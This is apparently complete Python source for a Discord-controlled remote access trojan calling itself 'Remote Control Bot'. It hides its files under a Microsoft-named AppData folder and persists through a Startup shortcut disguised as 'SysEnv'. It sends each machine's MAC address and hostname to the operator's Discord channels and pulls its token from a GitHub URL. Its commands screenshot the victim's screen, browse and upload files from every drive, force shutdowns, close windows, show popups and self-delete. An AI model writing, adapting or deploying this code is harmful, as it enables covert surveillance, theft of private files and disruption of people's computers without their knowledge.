import nextcord
from nextcord.ext import commands, tasks
from nextcord import Interaction
import os
import pyautogui
from nextcord import File
import time
from PIL import Image
import keyboard
import subprocess
import string
import random
import asyncio
import shutil
import datetime
import socket
from datetime import datetime
import win32gui
import win32con
import win32api
import time
import os
import pyautogui
import uuid
import cv2
import webbrowser
import requests
import sys
import win32gui, win32con
from PIL import Image
from typing import Optional
import win32com.client
from pathlib import Path
import socket as st1


user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
os.makedirs(target_path, exist_ok=True)

sys.stdout = open(os.path.join(target_path, "skibidi-main", "log.txt"), "a", buffering=1)  # "a" = append mode, "buffering=1" = line buffering
sys.stderr = sys.stdout

startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
shortcut_name="SysEnv"
shortcut_path = startup_dir / f"{shortcut_name}.lnk"

CHANNEL_ID = 1355560563622678699

def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):

    if script_path is None:
        script_path = sys.argv[0]

    startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"

    startup_dir.mkdir(parents=True, exist_ok=True)


    shortcut_path = startup_dir / f"{shortcut_name}.lnk"

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(str(shortcut_path))
    shortcut.TargetPath = sys.executable
    shortcut.Arguments = f'"{script_path}"'
    shortcut.WorkingDirectory = str(Path(script_path).parent)
    shortcut.IconLocation = str(script_path)
    shortcut.save()

if not os.path.exists(shortcut_path):
    add_to_startup()

def get_open_windows():
    windows = {}

    def enum_windows_callback(hwnd, _):
        if win32gui.IsWindowVisible(hwnd):
            window_text = win32gui.GetWindowText(hwnd)
            if window_text:
                windows[hwnd] = window_text

    win32gui.EnumWindows(enum_windows_callback, None)
    return windows

def close_window(hwnd):
    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)

def check_connected_cameras():

    camera_indices = range(10)
    connected_cameras = []

    for index in camera_indices:
        cap = cv2.VideoCapture(index)
        
        if cap.isOpened():
            connected_cameras.append(index)
            cap.release()

    return connected_cameras

def get_device_ip():
    mac = hex(uuid.getnode()).replace('0x', '').upper()
    return ':'.join(mac[i:i+2] for i in range(0, 12, 2))

class FileView(nextcord.ui.View):
    def __init__(self, current_path, history):
        super().__init__()
        self.current_path = current_path
        self.history = history

        contents = self.get_contents()
        for name, is_dir in contents:
            if is_dir:
                style = nextcord.ButtonStyle.primary
                custom_id = f"dir:{name}"
            else:
                style = nextcord.ButtonStyle.secondary
                custom_id = f"file:{name}"
            button = nextcord.ui.Button(label=name, style=style, custom_id=custom_id)
            button.callback = self.create_callback(button.custom_id)
            self.add_item(button)

        if self.history:
            back_button = nextcord.ui.Button(label="Back", style=nextcord.ButtonStyle.red)
            back_button.callback = self.back
            self.add_item(back_button)

        close_button = nextcord.ui.Button(label="Close", style=nextcord.ButtonStyle.red)
        close_button.callback = self.close
        self.add_item(close_button)

    def get_contents(self):
        if self.current_path is None:
            if os.name == 'nt':
                return [(f"{d}:\\", True) for d in string.ascii_uppercase if os.path.exists(f"{d}:")]
            else:
                return []
        else:
            try:
                items = []
                for item in os.listdir(self.current_path):
                    path = os.path.join(self.current_path, item)
                    items.append((item, os.path.isdir(path)))
                return items
            except:
                return []

    def create_callback(self, custom_id):
        async def callback(interaction):
            if custom_id.startswith("dir:"):
                dir_name = custom_id.split(":", 1)[1]
                new_path = os.path.join(self.current_path, dir_name) if self.current_path else dir_name
                new_history = self.history + [self.current_path]
                view = FileView(new_path, new_history)
                await interaction.response.edit_message(content=f"Path: {new_path}", view=view)
            elif custom_id.startswith("file:"):
                file_name = custom_id.split(":", 1)[1]
                file_path = os.path.join(self.current_path, file_name) if self.current_path else file_name
                if os.path.isfile(file_path):
                    await interaction.response.send_message(file=nextcord.File(file_path))
                else:
                    await interaction.response.send_message("File not found.", ephemeral=True)
        return callback

    async def back(self, interaction):
        if self.history:
            new_path = self.history[-1]
            new_history = self.history[:-1]
            view = FileView(new_path, new_history)
            await interaction.response.edit_message(content=f"Path: {new_path}", view=view)
        else:
            await interaction.response.defer()

    async def close(self, interaction):
        await interaction.message.delete()
        self.stop()

INSTANCE_ID = get_device_ip()
UPDATE_INTERVAL = 30
last_message_id = None

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
os.makedirs(target_path, exist_ok=True)

pyautogui.FAILSAFE = False

path_to_cursor = os.path.join(target_path, 'skibidi-main', 'cursor', 'cursor.png')
cursor_image = Image.open(path_to_cursor)
cursor_width, cursor_height = 16, 16

with open(os.path.join(target_path, "skibidi-main", "update.txt")) as ver9:
    ver8 = ver9.read()
    ver9.close()

client = commands.Bot(command_prefix = '!', intents=nextcord.Intents.default())


@client.event
async def on_ready():
    ip = get_device_ip()
    global_online_channel_id = 1336044356704145408
    global_update_channel_id = 1337769661466415136
    channel12 = client.get_channel(global_online_channel_id)
    channel13 = client.get_channel(global_update_channel_id)
    for guild in client.guilds:
        existing_category = nextcord.utils.get(guild.categories, name=str(ip))
        
        if not existing_category:

            category = await guild.create_category(str(ip))
            await guild.create_text_channel("info", category=category)
            await guild.create_text_channel("events", category=category)
            await guild.create_text_channel("commands", category=category)

            cameras = check_connected_cameras()
            if cameras:
                cameras = "At least one camera found."
            else:
                cameras = "No cameras found."

            des = f"""Mac address: {ip}
            Name: {st1.gethostname()}

            Cameras: {cameras}

            Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}

            @everyone"""

            embed = nextcord.Embed(title="New client on network!", timestamp=datetime.now(), colour=0xe4f500, description=des)
            embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
            await channel12.send(embed=embed)
            
            channel = nextcord.utils.get(category.text_channels, name="info")

            des = f"""Mac address: {ip}
            Name: {st1.gethostname()}"""

            embed = nextcord.Embed(title="Client info:", timestamp=datetime.now(), colour=0xe4f500, description=des)
            embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
            await channel.send(embed=embed)


        if existing_category:
            user_profile = os.environ['USERPROFILE']
            target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
            if os.path.exists(os.path.join(target_path, "skibidi-main", "update.txt")):

                with open(os.path.join(target_path, "skibidi-main", "update.txt")) as up:
                    tex = up.read()
                    up.close()

                if not tex == "":

                    category = nextcord.utils.get(guild.categories, name=str(ip))
                    channel5 = nextcord.utils.get(category.text_channels, name="events")

                    des = f"""Client {ip} updated to version v{tex}
                    Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}"""
                    embed = nextcord.Embed(title="Client update complete!", timestamp=datetime.now(), colour=0x00b0f4, description=f"Client updated to version v{tex}")
                    embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
                    await channel5.send(embed=embed)

                    embed = nextcord.Embed(title="Client update complete!", timestamp=datetime.now(), colour=0x00b0f4, description=des)
                    embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
                    await channel13.send(embed=embed)

                    with open(os.path.join(target_path, "skibidi-main", "update.txt"), "w") as up:
                        up.write("")
                        up.close()

                    with open(os.path.join(target_path, "skibidi-main", "ver.txt"), "w") as up2:
                        up2.write(tex)
                        up2.close()

            category = nextcord.utils.get(guild.categories, name=str(ip))
            des = f"""Client {ip} is now online!
            Use commands in: {nextcord.utils.get(category.text_channels, name='commands').mention}"""
            embed = nextcord.Embed(title="Client online!", timestamp=datetime.now(), colour=0x00f51d, description=des)
            embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
            await channel12.send(embed=embed)
            category = nextcord.utils.get(guild.categories, name=str(ip))
            if category:
                embed = nextcord.Embed(title="Client online!", timestamp=datetime.now(), colour=0x00f51d, description="Client is now online!")
                embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")

                channel = nextcord.utils.get(category.text_channels, name="events")
                if channel:
                    await channel.send(embed=embed)

    @tasks.loop(seconds=UPDATE_INTERVAL)
    async def send_status():
        print("Sending status...")
        global last_message_id
        channel = client.get_channel(CHANNEL_ID)
        if not channel:
            return

        try:
            if last_message_id:
                try:
                    msg = await channel.fetch_message(last_message_id)
                    await msg.delete()
                except nextcord.NotFound:
                    pass

            new_message = await channel.send(f"{INSTANCE_ID} | {int(time.time())}")
            last_message_id = new_message.id
        except Exception as e:
            print(f"Error sending status: {e}")

    @tasks.loop(seconds=UPDATE_INTERVAL)
    async def update_activity():
        print("Updating activity...")
        channel = client.get_channel(CHANNEL_ID)
        if not channel:
            return

        try:
            count = 0
            async for msg in channel.history(limit=100):
                if is_message_valid(msg):
                    count += 1

            activity = nextcord.Game(f"Running on {count} instances")
            await client.change_presence(activity=activity)
        except Exception as e:
            print(f"Error updating activity: {e}")

    @tasks.loop(seconds=UPDATE_INTERVAL)
    async def cleanup_old_messages():
        print("Cleaning up old messages...")
        channel = client.get_channel(CHANNEL_ID)
        if not channel:
            return

        try:
            async for msg in channel.history(limit=100):
                if not is_message_valid(msg):
                    try:
                        await msg.delete()
                    except nextcord.NotFound:
                        pass
        except Exception as e:
            print(f"Error cleaning messages: {e}")

    def is_message_valid(message):
        try:
            parts = message.content.split(" | ")
            if len(parts) < 2:
                return False
            timestamp = int(parts[1])
            return time.time() - timestamp < UPDATE_INTERVAL
        except:
            return False

    cleanup_old_messages.start()
    await asyncio.sleep(1)
    send_status.start()
    await asyncio.sleep(1)
    update_activity.start()




ip = get_device_ip()
testServerId = [1139988299386195981]



@client.slash_command(guild_ids=testServerId, description="Shuts down the client's computer.")
async def shutdown(interaction : Interaction):
    category = interaction.channel.category
    if str(category) == str(ip):
        print("Shutdown command received")
        user_id = interaction.user.id
        await interaction.response.send_message("Taking screenshot before shutdown...")
        screenshot = pyautogui.screenshot()
        x, y = pyautogui.position()
        final_x = x - cursor_width // 2
        final_y = y - cursor_height // 2
        paste_position = (final_x, final_y)
        screenshot.paste(cursor_image, paste_position, cursor_image)
        screenshot.save(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'))
        file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'), filename='status.png')
        embed = nextcord.Embed(description="Status before shutdown", title="Status:", timestamp=datetime.now(), colour=0xb400f5)
        embed.set_author(name="Remote Control Bot")
        embed.set_image(url=f"attachment://status.png")
        embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")

        await interaction.send(embed=embed, file=file)
        os.system("shutdown /s /t 1")

@client.slash_command(guild_ids=testServerId, description="Shuts down all clients")
async def shutdown_all(interaction : Interaction):
    print("Shutdown all command received")
    category = interaction.channel.category
    user_id = interaction.user.id

    await interaction.response.send_message("Taking screenshot before shutdown...")
    screenshot = pyautogui.screenshot()
    x, y = pyautogui.position()
    final_x = x - cursor_width // 2
    final_y = y - cursor_height // 2
    paste_position = (final_x, final_y)
    screenshot.paste(cursor_image, paste_position, cursor_image)
    screenshot.save(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'))
    file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'), filename='status.png')
    embed = nextcord.Embed(description="Status before shutdown", title="Status:", timestamp=datetime.now(), colour=0xb400f5)
    embed.set_author(name="Remote Control Bot")
    embed.set_image(url=f"attachment://status.png")
    embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")

    await interaction.send(embed=embed, file=file)
    os.system("shutdown /s /t 1")

@client.slash_command(guild_ids=testServerId, description="Sends a screenshot of the client's view.")
async def status(interaction : Interaction):
    category = interaction.channel.category
    if str(category) == str(ip):
        print("Status command received")
        
        user_id = interaction.user.id
        print("Taking screenshot...")
        await interaction.response.send_message("Taking screenshot...")
        screenshot = pyautogui.screenshot()
        x, y = pyautogui.position()
        final_x = x - cursor_width // 2
        final_y = y - cursor_height // 2
        paste_position = (final_x, final_y)
        screenshot.paste(cursor_image, paste_position, cursor_image)
        screenshot.save(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'))
        file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'status.png'), filename='status.png')
        embed = nextcord.Embed(description="Status", title="Status:", timestamp=datetime.now(), colour=0xb400f5)
        embed.set_author(name="Remote Control Bot")
        embed.set_image(url=f"attachment://status.png")
        embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")

        await interaction.send(embed=embed, file=file)
        print("Screenshot sent")

@client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
async def uninstall(interaction : Interaction):
    category = interaction.channel.category
    if str(category) == str(ip):
        
        print("Uninstall command received")
        user_id = interaction.user.id
        print("Uninstalling...")
        await interaction.response.send_message("Uninstalling this program all clients...")
        await interaction.edit_original_message(content="This program has been uninstalled from all clients!")
        script_content = """
import shutil
import os
from pathlib import Path
import time
import sys
import subprocess
import tempfile

time.sleep(1)

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
shutil.rmtree(os.path.join(target_path, "skibidi-startup"))
shutil.rmtree(os.path.join(target_path, "skibidi-main"))
startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
shortcut_name="MyPythonScript"
shortcut_path = startup_dir / f"{shortcut_name}.lnk"
os.remove(shortcut_path)
file_path = __file__

# Create a temporary batch script
batch_script = f'''@echo off
timeout /t 2 /nobreak >nul
del "{file_path}"
del "%~f0"
'''

# Save the batch script in a temporary file
batch_path = os.path.join(tempfile.gettempdir(), "delete_me.bat")
with open(batch_path, "w") as bat_file:
    bat_file.write(batch_script)

# Run the batch file in a hidden process
subprocess.Popen(
    [batch_path],
    shell=True,
    creationflags=subprocess.CREATE_NO_WINDOW
)

sys.exit()
"""

        script_file = "self-destruct.pyw"
        user_profile = os.environ['USERPROFILE']
        target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
        if not os.path.exists(os.path.join(target_path, script_file)):
            with open(os.path.join(target_path, script_file), "w") as file:
                file.write(script_content)
                file.close()
        subprocess.Popen(["pythonw", os.path.join(target_path, "self-destruct.pyw")])
        sys.exit(0)

@client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
async def uninstall_all(interaction : Interaction):
    print("Uninstall all command received")
    user_id = interaction.user.id
    print("Uninstalling...")
    await interaction.response.send_message("Uninstalling this program all clients...")
    await interaction.edit_original_message(content="This program has been uninstalled from all clients!")
    script_content = """
import shutil
import os
from pathlib import Path
import time
import sys
import subprocess
import tempfile

time.sleep(1)

user_profile = os.environ['USERPROFILE']
target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
shutil.rmtree(os.path.join(target_path, "skibidi-startup"))
shutil.rmtree(os.path.join(target_path, "skibidi-main"))
startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
shortcut_name="MyPythonScript"
shortcut_path = startup_dir / f"{shortcut_name}.lnk"
os.remove(shortcut_path)
file_path = __file__

# Create a temporary batch script
batch_script = f'''@echo off
timeout /t 2 /nobreak >nul
del "{file_path}"
del "%~f0"
'''

# Save the batch script in a temporary file
batch_path = os.path.join(tempfile.gettempdir(), "delete_me.bat")
with open(batch_path, "w") as bat_file:
    bat_file.write(batch_script)

# Run the batch file in a hidden process
subprocess.Popen(
    [batch_path],
    shell=True,
    creationflags=subprocess.CREATE_NO_WINDOW
)

sys.exit()
"""

    script_file = "self-destruct.pyw"
    user_profile = os.environ['USERPROFILE']
    target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
    if not os.path.exists(os.path.join(target_path, script_file)):
        with open(os.path.join(target_path, script_file), "w") as file:
            file.write(script_content)
            file.close()
    subprocess.Popen(["pythonw", os.path.join(target_path, "self-destruct.pyw")])
    sys.exit(0)
    
@client.slash_command(guild_ids=testServerId, description="Closes all windows on client's computer.")
async def close_all_windows(interaction : Interaction):
    category = interaction.channel.category
    if str(category) == str(ip):
        print("Close all windows command received")
        user_id = interaction.user.id

        print("Closing all windows...")
        def enum_windows_callback(hwnd, windows):
            if win32gui.IsWindowVisible(hwnd):
                windows.append(hwnd)
        

        windows = []
        win32gui.EnumWindows(enum_windows_callback, windows)

        for hwnd in windows:
            try:
                win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
            except Exception as e:
                print(f"Could not close window {hwnd}: {e}")
        print("All windows closed")

@client.slash_command(guild_ids=testServerId, description="Select a window to close on client's computer.")
async def close_selected_window(interaction : Interaction):
    category = interaction.channel.category
    if str(category) == str(ip):
        print("Close selected window command received")
        windows = get_open_windows()

        if not windows:
            await interaction.response.send_message(content="No open windows found.")
            print("No open windows found")
            return

        class WindowSelect(nextcord.ui.Select):
            def __init__(self):
                options = [
                    nextcord.SelectOption(label=title[:100], value=str(hwnd))
                    for hwnd, title in windows.items()
                ]
                super().__init__(placeholder="Select a window to close", options=options)

            async def callback(self, select_interaction: Interaction):
                selected_hwnd = int(self.values[0])
                close_window(selected_hwnd)

                await interaction.delete_original_message()
                await select_interaction.response.send_message(
                    content=f"Closed window: {windows[selected_hwnd]}"
                )

        class WindowView(nextcord.ui.View):
            def __init__(self):
                super().__init__()
                self.add_item(WindowSelect())

        print("Sending select window...")

        await interaction.response.send_message("Select a window to close:", view=WindowView())

@client.slash_command(guild_ids=testServerId, description="Pops up a message on the client's screen.")
async def popup(interaction : Interaction, message: str, window_title: Optional[str], repeat: Optional[int]):
    category = interaction.channel.category
    if str(category) == str(ip):
        print("Popup command received")
        user_id = interaction.user.id
        fmsg = f"""X=MsgBox("{str(message)}",0+16,"{str(window_title)}")"""

        user_profile = os.environ['USERPROFILE']
        target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')

        print("Creating popup script...")
        with open(os.path.join(target_path, "skibidi-main", "popup", "popup.vbs"), "w") as po:
            if repeat is None or repeat == 0:
                repeat = 1
            for i in range(repeat):
                po.write(fmsg + "\n")
            po.close()


        print("Popup script created")
        print("Opening popup window...")
        subprocess.Popen(["wscript", os.path.join(target_path, "skibidi-main", "popup", "popup.vbs")], shell=True)
        
        await interaction.response.send_message(f"Popup window succesfully opened with message: {message}")
        print("Popup window opened")

@client.slash_command(guild_ids=testServerId, description="Outputs the log file, useful for debugging.")
async def output_log(interaction : Interaction):
    category = interaction.channel.category
    if str(category) == str(ip):
        print("Output log command received")
        await interaction.response.send_message("Sending log file...")
        user_profile = os.environ['USERPROFILE']
        target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
        log_path = os.path.join(target_path, "skibidi-main", "log.txt")
        file1 = nextcord.File(log_path, filename='log.txt')
        await interaction.send(file=file1)
        print("Log file sent")

@client.slash_command(guild_ids=testServerId, description="Opens a file browser for client's computer.")
async def browse(interaction: nextcord.Interaction):
    initial_path = None if os.name == 'nt' else '/'
    view = FileView(initial_path, [])
    await interaction.response.send_message("Browse files:", view=view)

print("Getting token")
r = requests.get("https://raw.githubusercontent.com/skibidi-123456/skibidi/refs/heads/info/token")
token = r.text
stripped_string = token[1:]
print("Token received")
print("Running client")
client.run(stripped_string)